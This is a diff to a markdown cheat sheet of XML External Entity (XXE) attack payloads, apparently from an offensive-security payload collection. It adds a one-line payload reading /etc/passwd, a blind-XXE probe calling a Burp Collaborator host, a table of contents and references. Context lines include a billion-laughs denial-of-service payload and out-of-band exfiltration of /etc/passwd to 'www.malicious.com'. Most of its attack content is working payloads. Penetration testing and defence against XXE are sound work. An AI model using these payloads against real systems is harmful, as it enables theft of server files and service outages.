@@ -1,11 +1,25 @@
 # XML External Entity
 
-An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities.
-XML entities can be used to tell the XML parser to fetch specific content on the server.
+> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
+
+**Internal Entity**: If an entity is declared within a DTD it is called as internal entity.    
+Syntax: `<!ENTITY entity_name "entity_value">`
+
+**External Entity**: If an entity is declared outside a DTD it is called as external entity. Identified by `SYSTEM`.    
+Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
+
+## Summary
+
+- [Exploit](#exploit)
+- [Basic XXE](#basic-xxe)
+- [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
+- [Deny of service](#deny-of-service)
+- [Blind XXE - Out of Band](#blind-xxe---out-of-Band)
+- [XXE in exotic files](#xxe-in-exotic-files)
 
 ## Exploit
 
-Basic XML external entity test, the result should contain "John" in `firstName` and "Doe" in `lastName`.
+Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.
 
 ```xml
 <!--?xml version="1.0" ?-->
@@ -16,9 +30,15 @@ Basic XML external entity test, the result should contain "John" in `firstName` 
  </userInfo>
 ```
 
+It might help to set the `Content-Type: application/xml` in the request when sending XML payload to the server.
+
 ## Basic XXE
 
-Classic XXE
+Classic XXE, we try to display the content of the file `/etc/passwd` 
+
+```xml
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
+```
 
 ```xml
 <?xml version="1.0"?>
@@ -75,7 +95,7 @@ Classic XXE Base64 encoded
 
 ## Deny of service
 
-**Warning** : These attacks will disable the service or the server, do not use them on the Prod.
+**Warning** : These attacks might kill the service or the server, do not use them on the production.
 
 Billion Laugh Attack
 
@@ -109,6 +129,17 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.
 
 ### Blind XXE
+
+The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
+]>
+<r></r>
+```
+
 
 Send the content of `/etc/passwd` to "www.malicious.com", you may receive only the first line.
 
@@ -153,6 +184,8 @@ File stored on http://127.0.0.1/dtd.xml
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
 
+## XXE in exotic files
+
 ### XXE inside SOAP
 
 ```xml
@@ -194,5 +227,7 @@ GIF (experimental)
 * [Detecting and exploiting XXE in SAML Interfaces - Von Christian Mainka](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
 * [staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
 * [mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
-* [Exploiting xxe in file upload functionality - BLACKHAT WEBCAST- 11/19/15 Will Vandevanter - @_will_is_](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
+* [Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 Will Vandevanter - @_will_is_](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
 * [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer)](http://en.hackdig.com/08/28075.htm)
+* [Understanding Xxe From Basic To Blind - 10/11/2018 - Utkarsh Agrawal](http://agrawalsmart7.com/2018/11/10/Understanding-XXE-from-Basic-to-Blind.html)
+* [From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
